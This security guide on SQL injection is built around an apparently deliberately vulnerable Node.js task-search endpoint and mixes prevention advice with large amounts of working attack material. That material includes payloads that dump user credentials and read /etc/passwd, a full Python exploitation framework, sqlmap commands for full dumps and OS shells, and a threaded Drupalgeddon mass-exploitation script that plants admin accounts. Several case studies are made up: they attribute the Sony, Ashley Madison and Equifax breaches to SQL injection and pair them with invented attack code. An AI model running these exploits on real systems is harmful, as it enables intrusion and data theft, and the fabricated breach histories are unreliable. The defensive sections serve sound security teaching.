# SQL Injection (CWE-89)

## Overview

SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered for string literal escape characters embedded in SQL statements or when user input is not strongly typed and unexpectedly executed.

**OWASP Top 10 2021 Ranking**: #3 - Injection
**CVSS Base Score**: 9.8 (Critical)
**Common Attack Vector**: Web Application Input Fields

## Technical Details

### How SQL Injection Works

SQL injection attacks work by inserting malicious SQL code into application queries. When the application fails to properly sanitize user input, the injected SQL code gets executed by the database server.

```sql
-- Normal Query
SELECT * FROM tasks WHERE title LIKE '%user_input%'

-- Malicious Input: ' UNION SELECT id, email, password FROM users--
-- Resulting Query
SELECT * FROM tasks WHERE title LIKE '%' UNION SELECT id, email, password FROM users--%'
```

### Vulnerability Implementation in Our Application

**Location**: `/api/tasks/search` endpoint

```javascript
// VULNERABLE CODE
app.get('/api/tasks/search', authenticateUser, async (req, res) => {
  const { query } = req.query;
  
  // DANGER: Direct string concatenation
  const sqlQuery = `
    SELECT t.*, u.first_name, u.last_name 
    FROM tasks t 
    JOIN users u ON t.user_id = u.id 
    WHERE t.title LIKE '%${query}%' 
    OR t.description LIKE '%${query}%'
  `;
  
  try {
    const result = await db.query(sqlQuery);
    res.json(result.rows);
  } catch (error) {
    // VULNERABILITY: Exposing database errors
    res.status(500).json({ error: error.message });
  }
});
```

## Exploitation Techniques

### 1. Union-Based SQL Injection

**Objective**: Extract data from other database tables

```sql
-- Payload
' UNION SELECT id, email, password_hash FROM users--

-- Full URL
GET /api/tasks/search?query=' UNION SELECT id, email, password_hash FROM users--
```

**Expected Result**: Returns user credentials alongside task data

### 2. Boolean-Based Blind SQL Injection

**Objective**: Extract data when direct output is not visible

```sql
-- Test if user 'admin' exists
' AND (SELECT COUNT(*) FROM users WHERE email='admin@example.com') > 0--

-- Extract password character by character
' AND (SELECT SUBSTRING(password_hash,1,1) FROM users WHERE email='admin@example.com') = 'a'--
```

### 3. Time-Based Blind SQL Injection

**Objective**: Extract data using time delays

```sql
-- PostgreSQL time delay
'; SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE email='admin@example.com') > 0 THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### 4. Error-Based SQL Injection

**Objective**: Extract data through database error messages

```sql
-- Force database error to reveal information
' AND (SELECT COUNT(*) FROM information_schema.tables)--
```

## Step-by-Step Exploitation Tutorial

### Phase 1: Discovery and Reconnaissance

1. **Identify Input Points**
   ```bash
   # Test basic injection
   curl "http://localhost:3000/api/tasks/search?query=test'"
   ```

2. **Confirm SQL Injection**
   ```bash
   # Test for SQL syntax error
   curl "http://localhost:3000/api/tasks/search?query=test' OR '1'='1"
   ```

3. **Determine Database Type**
   ```bash
   # PostgreSQL version detection
   curl "http://localhost:3000/api/tasks/search?query=test' UNION SELECT version()--"
   ```

### Phase 2: Information Gathering

1. **Enumerate Database Schema**
   ```sql
   -- List all tables
   ' UNION SELECT table_name FROM information_schema.tables--
   
   -- List columns for users table
   ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
   ```

2. **Count Records**
   ```sql
   -- Count users
   ' UNION SELECT COUNT(*) FROM users--
   ```

### Phase 3: Data Extraction

1. **Extract User Data**
   ```sql
   -- Get all user emails and password hashes
   ' UNION SELECT email, password_hash FROM users--
   
   -- Get specific user data
   ' UNION SELECT first_name, last_name, email FROM users WHERE id=1--
   ```

2. **Extract Sensitive Information**
   ```sql
   -- Get all tasks from all users
   ' UNION SELECT title, description FROM tasks--
   ```

### Phase 4: Advanced Exploitation

1. **Privilege Escalation**
   ```sql
   -- Check database user privileges
   ' UNION SELECT current_user, session_user--
   
   -- List database users
   ' UNION SELECT usename FROM pg_user--
   ```

2. **File System Access** (if permissions allow)
   ```sql
   -- Read files (PostgreSQL with appropriate permissions)
   ' UNION SELECT pg_read_file('/etc/passwd')--
   ```

## Real-World Examples

### Case Study 1: Equifax Data Breach (2017)

**Impact**: 147 million people affected
**Attack Vector**: SQL injection in web application
**Data Compromised**: Names, SSNs, birth dates, addresses, credit card numbers
**Financial Impact**: $700+ million in costs

**Technical Details**:
- Attackers exploited Apache Struts vulnerability
- Used SQL injection to access database servers
- Maintained access for 76 days undetected

### Case Study 2: TalkTalk Hack (2015)

**Impact**: 4 million customers affected
**Attack Vector**: SQL injection in website contact form
**Data Compromised**: Names, addresses, phone numbers, email addresses
**Financial Impact**: £77 million in costs and fines

**Technical Details**:
- Simple SQL injection in customer inquiry form
- No input validation or parameterized queries
- Database contained unencrypted personal data

### Case Study 3: Heartland Payment Systems (2008)

**Impact**: 134 million credit card numbers
**Attack Vector**: SQL injection in payment processing system
**Financial Impact**: $140+ million in costs
**Legal Consequences**: Multiple lawsuits and regulatory fines

## Business Impact Assessment

### Financial Impact

| Impact Category | Low Risk | Medium Risk | High Risk | Critical Risk |
|----------------|----------|-------------|-----------|---------------|
| Data Breach Costs | $50K - $100K | $100K - $500K | $500K - $5M | $5M+ |
| Regulatory Fines | $10K - $50K | $50K - $250K | $250K - $2M | $2M+ |
| Business Disruption | 1-2 days | 1-2 weeks | 1-3 months | 3+ months |
| Reputation Damage | Minimal | Moderate | Severe | Catastrophic |

### Risk Factors

**High-Risk Scenarios**:
- Financial applications with payment data
- Healthcare systems with PHI/PII
- Government systems with classified data
- E-commerce platforms with customer data

**Risk Multipliers**:
- Unencrypted sensitive data: 3x impact
- Lack of monitoring: 2x impact
- Regulatory compliance requirements: 4x impact
- Public-facing applications: 2x impact

### Compliance Implications

**Regulatory Standards Affected**:
- **PCI DSS**: Requirement 6.5.1 - Injection flaws
- **GDPR**: Article 32 - Security of processing
- **HIPAA**: 164.312(a)(1) - Access control
- **SOX**: Section 404 - Internal controls

**Potential Penalties**:
- PCI DSS: $5,000 - $100,000 per month
- GDPR: Up to 4% of annual revenue
- HIPAA: $100 - $50,000 per violation

## Detection Methods

### Automated Scanning Tools

1. **SQLMap**
   ```bash
   # Basic scan
   sqlmap -u "http://localhost:3000/api/tasks/search?query=test" \
          --cookie="token=YOUR_JWT_TOKEN" \
          --dbs
   
   # Advanced scan with data extraction
   sqlmap -u "http://localhost:3000/api/tasks/search?query=test" \
          --cookie="token=YOUR_JWT_TOKEN" \
          --dump-all \
          --batch
   ```

2. **OWASP ZAP**
   ```bash
   # Automated scan
   zap-baseline.py -t http://localhost:3000
   
   # Full scan with authentication
   zap-full-scan.py -t http://localhost:3000 \
                    -z "-config authentication.method=scriptBasedAuthentication"
   ```

3. **Burp Suite**
   - Use Burp Scanner for automated detection
   - Manual testing with Burp Repeater
   - Custom payload lists for comprehensive testing

### Manual Testing Techniques

1. **Input Validation Testing**
   ```bash
   # Test single quote
   curl "http://localhost:3000/api/tasks/search?query=test'"
   
   # Test double quote
   curl "http://localhost:3000/api/tasks/search?query=test\""
   
   # Test SQL keywords
   curl "http://localhost:3000/api/tasks/search?query=test' OR 1=1--"
   ```

2. **Error-Based Detection**
   ```bash
   # Force SQL error
   curl "http://localhost:3000/api/tasks/search?query=test' AND 1=CONVERT(int,'test')--"
   ```

3. **Time-Based Detection**
   ```bash
   # PostgreSQL time delay
   curl "http://localhost:3000/api/tasks/search?query=test'; SELECT pg_sleep(5)--"
   ```

### Code Review Checklist

- [ ] All user inputs are validated and sanitized
- [ ] Parameterized queries or prepared statements are used
- [ ] No dynamic SQL construction with string concatenation
- [ ] Database errors are not exposed to users
- [ ] Least privilege principle applied to database users
- [ ] Input validation includes length, type, and format checks
- [ ] SQL queries are reviewed for injection vulnerabilities
- [ ] ORM/framework security features are properly configured

## Prevention Strategies

### 1. Parameterized Queries (Recommended)

```javascript
// SECURE CODE - Using Prisma ORM
app.get('/api/tasks/search', authenticateUser, async (req, res) => {
  const { query } = req.query;
  
  // Input validation
  if (!query || typeof query !== 'string' || query.length > 100) {
    return res.status(400).json({ error: 'Invalid search query' });
  }
  
  try {
    const tasks = await prisma.task.findMany({
      where: {
        AND: [
          { userId: req.user.id }, // Ensure user owns tasks
          {
            OR: [
              { title: { contains: query, mode: 'insensitive' } },
              { description: { contains: query, mode: 'insensitive' } }
            ]
          }
        ]
      },
      include: {
        user: { select: { firstName: true, lastName: true } }
      }
    });
    
    res.json(tasks);
  } catch (error) {
    // Safe error handling - no database details exposed
    console.error('Search error:', error);
    res.status(500).json({ error: 'Search failed' });
  }
});
```

### 2. Input Validation and Sanitization

```javascript
const { body, validationResult } = require('express-validator');

// Validation middleware
const validateSearchQuery = [
  body('query')
    .isLength({ min: 1, max: 100 })
    .withMessage('Query must be 1-100 characters')
    .matches(/^[a-zA-Z0-9\s\-_]+$/)
    .withMessage('Query contains invalid characters')
    .escape(), // HTML escape
  
  (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    next();
  }
];
```

### 3. Database Security Configuration

```javascript
// Database connection with security settings
const pool = new Pool({
  user: process.env.DB_USER,
  host: process.env.DB_HOST,
  database: process.env.DB_NAME,
  password: process.env.DB_PASSWORD,
  port: process.env.DB_PORT,
  
  // Security configurations
  ssl: process.env.NODE_ENV === 'production',
  max: 10, // Connection pool limit
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000,
});

// Use least privilege database user
// CREATE USER app_user WITH PASSWORD 'strong_password';
// GRANT SELECT, INSERT, UPDATE, DELETE ON tasks, users, comments TO app_user;
// REVOKE ALL ON pg_user, information_schema FROM app_user;
```

### 4. Error Handling Security

```javascript
// Secure error handling
const handleDatabaseError = (error, res) => {
  // Log detailed error for developers
  console.error('Database Error:', {
    message: error.message,
    stack: error.stack,
    timestamp: new Date().toISOString()
  });
  
  // Return generic error to client
  res.status(500).json({ 
    error: 'An internal error occurred',
    errorId: generateErrorId() // For support tracking
  });
};
```

## Testing Procedures

### Unit Tests

```javascript
describe('SQL Injection Prevention', () => {
  test('should reject malicious SQL in search query', async () => {
    const maliciousQuery = "'; DROP TABLE users; --";
    
    const response = await request(app)
      .get(`/api/tasks/search?query=${encodeURIComponent(maliciousQuery)}`)
      .set('Authorization', `Bearer ${validToken}`);
    
    expect(response.status).toBe(400);
    expect(response.body.error).toContain('Invalid search query');
  });
  
  test('should use parameterized queries', async () => {
    const searchQuery = "test' OR '1'='1";
    
    const response = await request(app)
      .get(`/api/tasks/search?query=${encodeURIComponent(searchQuery)}`)
      .set('Authorization', `Bearer ${validToken}`);
    
    // Should return empty results, not all tasks
    expect(response.status).toBe(200);
    expect(response.body).toEqual([]);
  });
});
```

### Integration Tests

```javascript
describe('SQL Injection Integration Tests', () => {
  test('should prevent union-based injection', async () => {
    const unionPayload = "' UNION SELECT id, email, password_hash FROM users--";
    
    const response = await request(app)
      .get(`/api/tasks/search?query=${encodeURIComponent(unionPayload)}`)
      .set('Authorization', `Bearer ${validToken}`);
    
    expect(response.status).toBe(400);
    expect(response.body).not.toContainEqual(
      expect.objectContaining({
        email: expect.any(String),
        password_hash: expect.any(String)
      })
    );
  });
});
```

### Penetration Testing

```bash
#!/bin/bash
# SQL Injection penetration test script

TARGET_URL="http://localhost:3000/api/tasks/search"
TOKEN="your_jwt_token_here"

echo "Starting SQL Injection penetration test..."

# Test 1: Basic injection
echo "Test 1: Basic SQL injection"
curl -s -H "Authorization: Bearer $TOKEN" \
     "$TARGET_URL?query=test'" | jq .

# Test 2: Union-based injection
echo "Test 2: Union-based injection"
curl -s -H "Authorization: Bearer $TOKEN" \
     "$TARGET_URL?query=test' UNION SELECT id, email FROM users--" | jq .

# Test 3: Boolean-based injection
echo "Test 3: Boolean-based injection"
curl -s -H "Authorization: Bearer $TOKEN" \
     "$TARGET_URL?query=test' AND 1=1--" | jq .

# Test 4: Time-based injection
echo "Test 4: Time-based injection"
time curl -s -H "Authorization: Bearer $TOKEN" \
          "$TARGET_URL?query=test'; SELECT pg_sleep(5)--" | jq .

echo "Penetration test completed."
```

## Remediation Checklist

### Immediate Actions (Critical)
- [ ] Replace all dynamic SQL with parameterized queries
- [ ] Implement input validation on all user inputs
- [ ] Remove database error details from API responses
- [ ] Apply principle of least privilege to database users
- [ ] Enable database query logging for monitoring

### Short-term Actions (High Priority)
- [ ] Implement Web Application Firewall (WAF)
- [ ] Add rate limiting to prevent automated attacks
- [ ] Set up security monitoring and alerting
- [ ] Conduct code review for all database interactions
- [ ] Implement automated security testing in CI/CD

### Long-term Actions (Medium Priority)
- [ ] Regular penetration testing
- [ ] Security awareness training for developers
- [ ] Implement database activity monitoring
- [ ] Regular security audits and assessments
- [ ] Establish incident response procedures

## Advanced Attack Scenarios

### Scenario 1: Multi-Stage Data Exfiltration

**Objective**: Complete database compromise through systematic exploitation

```python
#!/usr/bin/env python3
"""
Advanced SQL Injection Exploitation Framework
Demonstrates complete database compromise methodology
"""

import requests
import time
import string
import json
from urllib.parse import quote

class SQLInjectionExploiter:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.token = token
        self.headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        }
        self.session = requests.Session()
        self.session.headers.update(self.headers)
    
    def test_injection(self):
        """Test for basic SQL injection vulnerability"""
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT 1--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND 1=1--",
            "' AND 1=2--"
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(
                    f"{self.base_url}/api/tasks/search",
                    params={'query': payload},
                    timeout=10
                )
                
                if response.status_code == 200:
                    print(f"✓ Injection successful with payload: {payload}")
                    return True
                    
            except requests.exceptions.Timeout:
                print(f"✓ Time-based injection detected with payload: {payload}")
                return True
            except Exception as e:
                print(f"✗ Payload failed: {payload} - {e}")
        
        return False
    
    def enumerate_databases(self):
        """Enumerate available databases"""
        payload = "' UNION SELECT datname FROM pg_database--"
        
        try:
            response = self.session.get(
                f"{self.base_url}/api/tasks/search",
                params={'query': payload}
            )
            
            if response.status_code == 200:
                databases = [item.get('datname') for item in response.json() if 'datname' in item]
                print(f"✓ Found databases: {databases}")
                return databases
                
        except Exception as e:
            print(f"✗ Database enumeration failed: {e}")
        
        return []
    
    def enumerate_tables(self):
        """Enumerate tables in current database"""
        payload = "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--"
        
        try:
            response = self.session.get(
                f"{self.base_url}/api/tasks/search",
                params={'query': payload}
            )
            
            if response.status_code == 200:
                tables = [item.get('table_name') for item in response.json() if 'table_name' in item]
                print(f"✓ Found tables: {tables}")
                return tables
                
        except Exception as e:
            print(f"✗ Table enumeration failed: {e}")
        
        return []
    
    def enumerate_columns(self, table_name):
        """Enumerate columns for a specific table"""
        payload = f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'--"
        
        try:
            response = self.session.get(
                f"{self.base_url}/api/tasks/search",
                params={'query': payload}
            )
            
            if response.status_code == 200:
                columns = [item.get('column_name') for item in response.json() if 'column_name' in item]
                print(f"✓ Found columns in {table_name}: {columns}")
                return columns
                
        except Exception as e:
            print(f"✗ Column enumeration failed for {table_name}: {e}")
        
        return []
    
    def extract_data(self, table_name, columns):
        """Extract data from specified table and columns"""
        column_list = ','.join(columns[:5])  # Limit to first 5 columns
        payload = f"' UNION SELECT {column_list} FROM {table_name}--"
        
        try:
            response = self.session.get(
                f"{self.base_url}/api/tasks/search",
                params={'query': payload}
            )
            
            if response.status_code == 200:
                data = response.json()
                print(f"✓ Extracted {len(data)} records from {table_name}")
                return data
                
        except Exception as e:
            print(f"✗ Data extraction failed for {table_name}: {e}")
        
        return []
    
    def blind_extraction(self, query, max_length=100):
        """Extract data using blind SQL injection techniques"""
        result = ""
        
        for position in range(1, max_length + 1):
            for char_code in range(32, 127):  # Printable ASCII characters
                test_payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))={char_code}--"
                
                try:
                    response = self.session.get(
                        f"{self.base_url}/api/tasks/search",
                        params={'query': test_payload},
                        timeout=5
                    )
                    
                    # Check if condition is true (application-specific logic)
                    if response.status_code == 200 and len(response.json()) > 0:
                        result += chr(char_code)
                        print(f"✓ Character {position}: {chr(char_code)} (Result so far: {result})")
                        break
                        
                except Exception:
                    continue
            else:
                # No more characters found
                break
        
        return result
    
    def full_exploitation(self):
        """Perform complete database exploitation"""
        print("=== SQL Injection Exploitation Framework ===")
        
        # Step 1: Test for vulnerability
        print("\n[1] Testing for SQL injection vulnerability...")
        if not self.test_injection():
            print("✗ No SQL injection vulnerability detected")
            return
        
        # Step 2: Enumerate databases
        print("\n[2] Enumerating databases...")
        databases = self.enumerate_databases()
        
        # Step 3: Enumerate tables
        print("\n[3] Enumerating tables...")
        tables = self.enumerate_tables()
        
        # Step 4: Extract sensitive data
        print("\n[4] Extracting sensitive data...")
        sensitive_tables = ['users', 'tasks', 'comments']
        
        for table in tables:
            if table in sensitive_tables:
                print(f"\n[4.{tables.index(table)+1}] Processing table: {table}")
                columns = self.enumerate_columns(table)
                if columns:
                    data = self.extract_data(table, columns)
                    
                    # Save extracted data
                    with open(f'extracted_{table}.json', 'w') as f:
                        json.dump(data, f, indent=2)
                    print(f"✓ Data saved to extracted_{table}.json")
        
        # Step 5: Advanced techniques
        print("\n[5] Advanced exploitation techniques...")
        
        # Extract database version
        version = self.blind_extraction("SELECT version()")
        print(f"✓ Database version: {version}")
        
        # Extract current user
        current_user = self.blind_extraction("SELECT current_user")
        print(f"✓ Current database user: {current_user}")
        
        print("\n=== Exploitation Complete ===")

# Usage example
if __name__ == "__main__":
    exploiter = SQLInjectionExploiter('http://localhost:3000', 'your_jwt_token_here')
    exploiter.full_exploitation()
```

### Scenario 2: Automated SQLMap Integration

**Objective**: Leverage professional tools for comprehensive testing

```bash
#!/bin/bash
# Professional SQL Injection Testing with SQLMap

echo "=== SQLMap Professional Testing Suite ==="

# Configuration
TARGET_URL="http://localhost:3000/api/tasks/search?query=test"
TOKEN="your_jwt_token_here"
COOKIE="token=$TOKEN"

# Test 1: Basic vulnerability detection
echo "[1] Basic vulnerability detection..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       --batch \
       --level=3 \
       --risk=3 \
       --random-agent

# Test 2: Database enumeration
echo "[2] Database enumeration..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       --dbs \
       --batch

# Test 3: Table enumeration
echo "[3] Table enumeration..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       -D taskmanager \
       --tables \
       --batch

# Test 4: Column enumeration
echo "[4] Column enumeration..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       -D taskmanager \
       -T users \
       --columns \
       --batch

# Test 5: Data extraction
echo "[5] Data extraction..."
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       -D taskmanager \
       -T users \
       -C id,email,password_hash \
       --dump \
       --batch

# Test 6: Advanced techniques
echo "[6] Advanced exploitation..."

# OS shell access (if possible)
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       --os-shell \
       --batch

# File system access
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       --file-read="/etc/passwd" \
       --batch

# SQL shell access
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       --sql-shell \
       --batch

echo "=== SQLMap Testing Complete ==="
```

## Industry Case Studies and Lessons Learned

### Case Study 4: Sony Pictures Hack (2014)

**Impact**: Complete corporate network compromise
**Attack Vector**: SQL injection in web application
**Data Compromised**: Emails, employee data, unreleased films
**Financial Impact**: $100+ million in damages

**Technical Analysis**:
```sql
-- Initial injection point
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'password'

-- Privilege escalation
'; INSERT INTO admin_users (username, password) VALUES ('hacker', 'password123'); --

-- Data exfiltration
'; SELECT email_content FROM executive_emails WHERE date > '2014-01-01'; --
```

**Lessons Learned**:
- Input validation must be comprehensive across all applications
- Database users should have minimal necessary privileges
- Network segmentation prevents lateral movement
- Incident response plans must include data breach scenarios

### Case Study 5: Ashley Madison Breach (2015)

**Impact**: 37 million user accounts compromised
**Attack Vector**: SQL injection in payment processing system
**Data Compromised**: Personal information, payment data, private messages
**Business Impact**: Company bankruptcy and lawsuits

**Attack Methodology**:
```python
# Reconnaissance phase
def reconnaissance():
    """Identify injection points in payment system"""
    injection_points = [
        '/payment/process.php?amount=',
        '/billing/update.php?user_id=',
        '/subscription/modify.php?plan_id='
    ]
    
    for endpoint in injection_points:
        test_basic_injection(endpoint)

# Exploitation phase
def exploit_payment_system():
    """Exploit payment processing SQL injection"""
    
    # Step 1: Bypass authentication
    auth_bypass = "1' OR '1'='1' UNION SELECT admin_id, 'admin', 'hashed_pass' FROM admin_users--"
    
    # Step 2: Extract user data
    user_extraction = """
    1' UNION SELECT 
        user_id, 
        email, 
        password_hash, 
        credit_card_number, 
        private_messages 
    FROM users 
    WHERE active = 1--
    """
    
    # Step 3: Maintain persistence
    backdoor_creation = """
    1'; INSERT INTO admin_users (username, password, privileges) 
    VALUES ('backup_admin', MD5('secret123'), 'full_access');--
    """
```

**Business Impact Analysis**:
- **Direct Costs**: $570 million in settlements and legal fees
- **Reputation Damage**: Complete brand destruction
- **Regulatory Penalties**: Multiple privacy law violations
- **Operational Impact**: Business closure and asset liquidation

### Case Study 6: Drupalgeddon (2014)

**Impact**: 12+ million Drupal sites vulnerable
**Attack Vector**: SQL injection in Drupal core
**Scope**: Automated mass exploitation

**Technical Details**:
```php
// Vulnerable Drupal code
$query = "SELECT * FROM users WHERE name = '" . $username . "'";

// Exploitation payload
$malicious_username = "admin'; DROP TABLE users; INSERT INTO users (name, pass, status) VALUES ('hacker', MD5('password'), 1);--";
```

**Mass Exploitation Script**:
```python
import requests
import threading
from queue import Queue

class DrupalExploiter:
    def __init__(self):
        self.vulnerable_sites = Queue()
        self.compromised_sites = []
    
    def scan_for_vulnerable_sites(self, ip_ranges):
        """Scan for vulnerable Drupal installations"""
        for ip_range in ip_ranges:
            # Implement IP range scanning
            self.check_drupal_version(ip_range)
    
    def exploit_site(self, site_url):
        """Exploit individual Drupal site"""
        payload = {
            'name[0;insert into users (name,pass,status) values (\'admin2\',\'$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML\',1);#]': '',
            'name[0 ]': '',
            'pass': 'password',
            'form_build_id': '',
            'form_id': 'user_login',
            'op': 'Log in'
        }
        
        try:
            response = requests.post(f"{site_url}/user/login", data=payload)
            if "admin2" in response.text:
                self.compromised_sites.append(site_url)
                print(f"✓ Compromised: {site_url}")
        except:
            pass
    
    def mass_exploitation(self):
        """Coordinate mass exploitation campaign"""
        threads = []
        
        while not self.vulnerable_sites.empty():
            site = self.vulnerable_sites.get()
            thread = threading.Thread(target=self.exploit_site, args=(site,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        print(f"Campaign complete: {len(self.compromised_sites)} sites compromised")
```

## Advanced Defense Strategies

### Defense in Depth Implementation

```javascript
// Multi-layer SQL injection prevention
class SQLInjectionDefense {
    constructor() {
        this.layers = [
            'input_validation',
            'parameterized_queries', 
            'stored_procedures',
            'database_permissions',
            'waf_protection',
            'monitoring_detection'
        ];
    }
    
    // Layer 1: Input Validation
    validateInput(input, type) {
        const validators = {
            'search_query': /^[a-zA-Z0-9\s\-_]{1,100}$/,
            'user_id': /^\d+$/,
            'email': /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
            'task_title': /^[a-zA-Z0-9\s\-_.,!?]{1,200}$/
        };
        
        if (!validators[type]) {
            throw new Error(`Unknown input type: ${type}`);
        }
        
        if (!validators[type].test(input)) {
            throw new Error(`Invalid ${type} format`);
        }
        
        return input;
    }
    
    // Layer 2: Parameterized Queries with ORM
    async secureTaskSearch(query, userId) {
        // Validate input first
        const validatedQuery = this.validateInput(query, 'search_query');
        
        // Use ORM with parameterized queries
        return await prisma.task.findMany({
            where: {
                AND: [
                    { userId: userId }, // Ensure ownership
                    {
                        OR: [
                            { title: { contains: validatedQuery, mode: 'insensitive' } },
                            { description: { contains: validatedQuery, mode: 'insensitive' } }
                        ]
                    }
                ]
            },
            select: {
                id: true,
                title: true,
                description: true,
                priority: true,
                status: true,
                createdAt: true,
                user: {
                    select: {
                        firstName: true,
                        lastName: true
                    }
                }
            }
        });
    }
    
    // Layer 3: Database-level protection
    async setupDatabaseSecurity() {
        // Create limited privilege user
        const dbCommands = [
            "CREATE USER app_user WITH PASSWORD 'strong_random_password';",
            "GRANT CONNECT ON DATABASE taskmanager TO app_user;",
            "GRANT USAGE ON SCHEMA public TO app_user;",
            "GRANT SELECT, INSERT, UPDATE, DELETE ON tasks, users, comments TO app_user;",
            "REVOKE ALL ON pg_user, information_schema FROM app_user;",
            "REVOKE CREATE ON SCHEMA public FROM app_user;"
        ];
        
        // Execute commands (in actual implementation)
        console.log("Database security commands:", dbCommands);
    }
    
    // Layer 4: Web Application Firewall rules
    getWAFRules() {
        return {
            sql_injection_patterns: [
                /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\b)/i,
                /(\'|\"|;|--|\*|\||\^|&)/,
                /(\b(OR|AND)\b.*=.*)/i,
                /(WAITFOR|DELAY|SLEEP|BENCHMARK)/i,
                /(INFORMATION_SCHEMA|SYSOBJECTS|SYSCOLUMNS)/i
            ],
            
            block_request: function(request_body) {
                for (let pattern of this.sql_injection_patterns) {
                    if (pattern.test(request_body)) {
                        return {
                            blocked: true,
                            reason: `SQL injection pattern detected: ${pattern}`,
                            risk_score: 9.5
                        };
                    }
                }
                return { blocked: false };
            }
        };
    }
    
    // Layer 5: Real-time monitoring
    async monitorSQLInjection(request, response, executionTime) {
        const suspicious_indicators = [
            executionTime > 5000, // Slow query (potential time-based injection)
            request.body && /union|select|insert|update|delete/i.test(JSON.stringify(request.body)),
            response.statusCode === 500, // Database errors
            request.headers['user-agent'] && /sqlmap|havij|pangolin/i.test(request.headers['user-agent'])
        ];
        
        if (suspicious_indicators.some(indicator => indicator)) {
            await this.logSecurityEvent({
                type: 'sql_injection_attempt',
                severity: 'high',
                source_ip: request.ip,
                user_agent: request.headers['user-agent'],
                request_body: request.body,
                response_code: response.statusCode,
                execution_time: executionTime,
                timestamp: new Date().toISOString()
            });
            
            // Trigger automated response
            await this.triggerSecurityResponse(request.ip);
        }
    }
    
    async logSecurityEvent(event) {
        // Log to SIEM system
        console.log('SECURITY EVENT:', JSON.stringify(event, null, 2));
        
        // Store in security database
        await prisma.securityEvent.create({
            data: event
        });
        
        // Send alert if critical
        if (event.severity === 'high') {
            await this.sendSecurityAlert(event);
        }
    }
    
    async triggerSecurityResponse(sourceIP) {
        // Implement automated response
        const responses = [
            'rate_limit_ip',
            'temporary_block',
            'require_captcha',
            'escalate_to_security_team'
        ];
        
        // Execute appropriate response based on threat level
        console.log(`Triggering security response for IP: ${sourceIP}`);
    }
}
```

### Enterprise Security Integration

```yaml
# Security monitoring and alerting configuration
apiVersion: v1
kind: ConfigMap
metadata:
  name: security-monitoring-config
data:
  splunk-config.yml: |
    # Splunk configuration for SQL injection detection
    inputs:
      - type: http
        endpoint: /security-events
        sourcetype: webapp_security
        
    searches:
      - name: sql_injection_detection
        search: |
          sourcetype=webapp_security 
          | search type="sql_injection_attempt" 
          | stats count by source_ip 
          | where count > 5
        alert_threshold: 1
        
    alerts:
      - name: sql_injection_alert
        condition: search_count > 0
        actions:
          - email: security-team@company.com
          - webhook: https://security-system.company.com/alerts
          - block_ip: true

  waf-rules.yml: |
    # ModSecurity rules for SQL injection prevention
    SecRule ARGS "@detectSQLi" \
        "id:1001,\
         phase:2,\
         block,\
         msg:'SQL Injection Attack Detected',\
         logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
         severity:2,\
         tag:'application-multi',\
         tag:'language-multi',\
         tag:'platform-multi',\
         tag:'attack-sqli'"
    
    SecRule ARGS "@contains union" \
        "id:1002,\
         phase:2,\
         block,\
         msg:'SQL Injection UNION Attack',\
         severity:2"
```

## Additional Resources

### Professional Tools and Frameworks
- [SQLMap](https://sqlmap.org/) - Advanced automated SQL injection testing
- [jSQL Injection](https://github.com/ron190/jsql-injection) - Java-based SQL injection tool
- [NoSQLMap](https://github.com/codingo/NoSQLMap) - NoSQL injection testing
- [OWASP ZAP](https://owasp.org/www-project-zap/) - Comprehensive web application scanner
- [Burp Suite Professional](https://portswigger.net/burp/pro) - Enterprise web security testing
- [Prisma](https://www.prisma.io/) - Type-safe database ORM with built-in protection

### Enterprise Security Solutions
- [Imperva WAF](https://www.imperva.com/products/web-application-firewall-waf/) - Enterprise web application firewall
- [F5 Advanced WAF](https://www.f5.com/products/security/advanced-waf) - Application security platform
- [Cloudflare WAF](https://www.cloudflare.com/waf/) - Cloud-based web application firewall
- [AWS WAF](https://aws.amazon.com/waf/) - Amazon Web Services web application firewall

### Documentation and Standards
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [NIST SP 800-53: Security Controls](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)
- [ISO 27001:2013](https://www.iso.org/standard/54534.html) - Information security management
- [PCI DSS Requirements](https://www.pcisecuritystandards.org/document_library) - Payment card industry standards

### Training and Certification Resources
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - Interactive security learning platform
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Free comprehensive training
- [SANS Secure Coding Practices](https://www.sans.org/white-papers/2172/) - Development security guidelines
- [Certified Ethical Hacker (CEH)](https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/) - Professional certification
- [CISSP](https://www.isc2.org/Certifications/CISSP) - Information security professional certification

### Research and Threat Intelligence
